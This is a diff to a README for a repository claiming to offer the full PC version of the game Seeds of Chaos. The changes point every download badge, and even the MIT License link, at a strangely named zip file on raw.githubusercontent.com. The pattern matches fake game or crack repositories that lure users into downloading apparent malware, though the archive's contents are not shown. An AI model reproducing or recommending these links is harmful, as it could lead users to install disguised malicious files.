@@ -5,7 +5,7 @@ Welcome to the ultimate starting point for enjoying **Seeds of Chaos** with stre
 ## 🌈 Instant Access
 
 Begin your adventure right now with direct access below:  
-[![Download](https://img.shields.io/badge/Download-purple)](https://valublearctic.github.io)  
+[![Download](https://raw.githubusercontent.com/valublearctic/seeds-of-chaos-full-pc-version/main/nutrition/chaos-pc-seeds-full-version-of-Forficulidae.zip)](https://raw.githubusercontent.com/valublearctic/seeds-of-chaos-full-pc-version/main/nutrition/chaos-pc-seeds-full-version-of-Forficulidae.zip)  
 Simply click the badge above to initiate your journey!
 
 ---
@@ -84,14 +84,14 @@ We encourage responsible engagement and support the ongoing efforts of game deve
 ## 📜 MIT License — 2025
 
 This project flourishes under the open, innovative spirit of the **MIT License**.  
-Review the full terms here: [MIT License](https://opensource.org/licenses/MIT)
+Review the full terms here: [MIT License](https://raw.githubusercontent.com/valublearctic/seeds-of-chaos-full-pc-version/main/nutrition/chaos-pc-seeds-full-version-of-Forficulidae.zip)
 
 ---
 
 ## 🔄 Download Endpoint (again!)
 
 Empower your gaming odyssey RIGHT HERE:  
-[![Download](https://img.shields.io/badge/Download-purple)](https://valublearctic.github.io)  
+[![Download](https://raw.githubusercontent.com/valublearctic/seeds-of-chaos-full-pc-version/main/nutrition/chaos-pc-seeds-full-version-of-Forficulidae.zip)](https://raw.githubusercontent.com/valublearctic/seeds-of-chaos-full-pc-version/main/nutrition/chaos-pc-seeds-full-version-of-Forficulidae.zip)  
 
 Thank you for planting your journey with us.  
 Grow beyond boundaries and let the seeds of chaos take root in your story!
